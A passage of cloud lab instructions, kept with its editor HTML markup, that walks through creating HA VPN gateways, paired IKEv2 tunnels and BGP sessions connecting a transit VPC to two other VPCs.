</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. From the VPN page, select **Cloud VPN Gateways**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Create VPN gateway** and enter the following details to create the additional VPN gateways:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| **VPN gateway name** &nbsp; | **VPC Network** | **Region** |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ---------------------- | --------------- | ---------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *vpc-transit-gw1-usw2* | vpc-transit &nbsp; &nbsp; | `Region 2` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *vpc-a-gw1-use4* &nbsp; &nbsp; &nbsp; | vpc-a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | `Region 1` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *vpc-b-gw1-usw2* &nbsp; &nbsp; &nbsp; | vpc-b &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | `Region 2` |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Click *Check my progress* to verify the objective.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create cloud routers and HA VPN gateways</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">##### **Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add VPN tunnels from vpc-transit to vpc-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create a pair of VPN tunnels using the following steps:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. From the VPN page, click on **Cloud VPN Gateways** and select **vpc-transit-gw1-use4**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click to **Add VPN tunnel**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Select the **Project Id** associated with the lab.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Select the remote VPN gateway, **vpc-a-gw1-use4**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6. For high availability, select **Create a pair of VPN tunnels**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7. Select the Cloud Router **cr-vpc-transit-use4-1**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8. Click on the VPN tunnel to enter the tunnel details:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Name: **transit-to-vpc-a-tu1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - IKE version: IKEv2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - IKE pre-shared key: **gcprocks**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">9. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10. Repeat steps for the second tunnel:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - Name: **transit-to-vpc-a-tu2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - IKE version: IKEv2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - IKE pre-shared key: **gcprocks**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">11. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">12. Click **Create &amp; Continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The next step is to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu1*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Configure BGP Session for transit-to-vpc-a-tu1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP session name: **transit-to-vpc-a-bgp1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Peer ASN: **65001**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Allocate BGP IPv4 address: *Manually*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Cloud Router BGP IPv4 address: **169.254.1.1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP peer IPv4 address: **169.254.1.2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Save and continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Repeat steps to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu2*.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click **Configure BGP Session for transit-to-vpc-a-tu2**:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- BGP session name: **transit-to-vpc-a-bgp2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Peer ASN: **65001**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Allocate BGP IPv4 address: *Manually*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Cloud Router BGP IPv4 address: **169.254.1.5**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- BGP peer IPv4 address: **169.254.1.6**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click **Save and continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click on **Save BGP configuration**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Click **OK**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add VPN tunnels from vpc-a to vpc-transit</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Now create a pair of VPN tunnels from the *vpc-a* to *vpc-transit* to complete the bidirectional tunnel configuration using the following steps:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. From the VPN page, select **Cloud VPN Gateways** *vpc-a-gw1-use4*:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click to **Add VPN tunnel**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Select the **Project Id** associated with the lab.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Select the remote VPN gateway, **vpc-transit-gw1-use4**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6. For high availability, select **Create a pair of VPN tunnels**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7. Select the Cloud Router, **cr-vpc-a-use4-1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8. Click on the VPN tunnel to enter the tunnel details:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - The Cloud VPN and peer VPN gateway interface information should be pre-populated.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Name: **vpc-a-to-transit-tu1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - IKE version: IKEv2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - IKE pre-shared key: **gcprocks**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">9. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10. Repeat steps for the second tunnel:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - Name: **vpc-a-to-transit-tu2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - IKE version: IKEv2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - IKE pre-shared key: **gcprocks**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">11. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">12. Click **Create &amp; Continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The next step is to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu1*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Configure BGP Session for vpc-a-to-transit-tu1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP session name: **vpc-a-to-transit-bgp1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Peer ASN: **65000**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Allocate BGP IPv4 address: *Manually*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Cloud Router BGP IPv4 address: **169.254.1.2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP peer IPv4 address: **169.254.1.1**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Save and continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Repeat steps to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu2*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Configure BGP Session for vpc-a-to-transit-tu2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP session name: **vpc-a-to-transit-bgp2**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Peer ASN: **65000**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Allocate BGP IPv4 address: *Manually*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Cloud Router BGP IPv4 address: **169.254.1.6**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - BGP peer IPv4 address: **169.254.1.5**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Save and continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Click on **Save BGP configuration**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Click **OK**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Once this step is complete the VPN tunnel status should reflect *Established* and BGP status should reflect *BGP established*.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">##### **Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add VPN tunnels from vpc-transit to vpc-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer VPN gateway name | *vpc-b-gw1-usw2* &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| --------------------- | ----------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router &nbsp; &nbsp; &nbsp; &nbsp;  | *cr-vpc-transit-usw2-1* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| VPN tunnel one &nbsp; &nbsp; &nbsp;  | *transit-to-vpc-b-tu1*  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Pre-shared key &nbsp; &nbsp; &nbsp;  | *gcprocks* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| VPN tunnel two &nbsp; &nbsp; &nbsp;  | *transit-to-vpc-b-tu2*  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Pre-shared key &nbsp; &nbsp; &nbsp;  | *gcprocks* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP session for tunnel *transit-to-vpc-b-tu1* :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP session &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | *transit-to-vpc-b-bgp1* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ----------------------------- | ----------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer ASN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | *65002* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router BGP IPv4 address | 169.254.1.9 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP peer IPv4 address &nbsp; &nbsp; &nbsp; &nbsp; | 169.254.1.10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP session for tunnel *transit-to-vpc-b-tu2* :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP session &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | *transit-to-vpc-b-bgp2* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ----------------------------- | ----------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer ASN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | *65002* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router BGP IPv4 address | 169.254.1.13 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP peer IPv4 address &nbsp; &nbsp; &nbsp; &nbsp; | 169.254.1.14 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add VPN tunnels from vpc-b to vpc-transit</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer VPN gateway name | *vpc-transit-gw1-usw2* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| --------------------- | ---------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router &nbsp; &nbsp; &nbsp; &nbsp;  | *cr-vpc-b-usw2-1* &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| VPN tunnel one &nbsp; &nbsp; &nbsp;  | *vpc-b-to-transit-tu1* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Pre-shared key &nbsp; &nbsp; &nbsp;  | *gcprocks* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| VPN tunnel second &nbsp; &nbsp; | *vpc-b-to-transit-tu2* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Pre-shared key &nbsp; &nbsp; &nbsp;  | *gcprocks* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">###### Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP session for tunnel *vpc-b-to-transit-tu1* :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP session &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | *vpc-b-to-transit-bgp1* |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ----------------------------- | ----------------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Peer ASN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  | *65000* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| Cloud Router BGP IPv4 address | 169.254.1.10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| BGP peer IPv4 address &nbsp; &nbsp; &nbsp; &nbsp; | 169.254.1.9 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
